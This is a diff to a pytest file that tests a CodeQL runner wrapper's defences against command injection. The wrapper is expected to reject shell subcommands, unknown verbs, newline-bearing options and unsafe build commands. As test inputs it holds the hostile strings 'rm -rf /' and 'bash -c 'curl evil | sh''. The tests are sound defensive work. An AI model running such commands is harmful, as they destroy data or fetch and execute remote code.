@@ -11,12 +11,12 @@ from doc_engine.scanning.build_command import BuildCommandError
 from doc_engine.scanning.support import _codeql_runner as runner
 import doc_engine.scanning.support._codeql_cli as cli_mod
 
+pytestmark = pytest.mark.domain_stage0
 
 def test_no_open_argv_runner_api():
     """Regression: an open ``_run_codeql(argv)`` lets callers pass ``bash -c``."""
     assert not hasattr(runner, "_run_codeql")
     assert callable(runner._invoke_codeql)
-
 
 def test_invoke_rejects_shell_as_subcommand(tmp_path: Path, monkeypatch):
     fake = tmp_path / "codeql"
@@ -26,7 +26,6 @@ def test_invoke_rejects_shell_as_subcommand(tmp_path: Path, monkeypatch):
         runner._invoke_codeql(fake, ("bash", "-c"), "rm -rf /", timeout=1)
     cli_mod.subprocess.run.assert_not_called()
 
-
 def test_invoke_rejects_unknown_verb(tmp_path: Path, monkeypatch):
     fake = tmp_path / "codeql"
     fake.write_text("", encoding="utf-8")
@@ -34,7 +33,6 @@ def test_invoke_rejects_unknown_verb(tmp_path: Path, monkeypatch):
     with pytest.raises(runner.CodeQLError, match="non-allowlisted"):
         runner._invoke_codeql(fake, ("execute",), "payload", timeout=1)
     cli_mod.subprocess.run.assert_not_called()
-
 
 def test_invoke_rejects_newline_option(tmp_path: Path, monkeypatch):
     fake = tmp_path / "codeql"
@@ -48,7 +46,6 @@ def test_invoke_rejects_newline_option(tmp_path: Path, monkeypatch):
             timeout=1,
         )
     cli_mod.subprocess.run.assert_not_called()
-
 
 def test_invoke_always_uses_resolved_exe_as_argv0(tmp_path: Path, monkeypatch):
     fake = tmp_path / "codeql"
@@ -70,7 +67,6 @@ def test_invoke_always_uses_resolved_exe_as_argv0(tmp_path: Path, monkeypatch):
     assert Path(captured[0][0]).resolve() == fake.resolve()
     assert captured[0][1:] == ["--version"]
 
-
 def test_create_database_revalidates_build_command(tmp_path: Path, monkeypatch):
     fake = tmp_path / "codeql"
     fake.write_text("", encoding="utf-8")
@@ -83,7 +79,6 @@ def test_create_database_revalidates_build_command(tmp_path: Path, monkeypatch):
             "bash -c 'curl evil | sh'",
         )
     cli_mod.subprocess.run.assert_not_called()
-
 
 def test_create_database_passes_validated_command_flag(tmp_path: Path, monkeypatch):
     fake = tmp_path / "codeql"
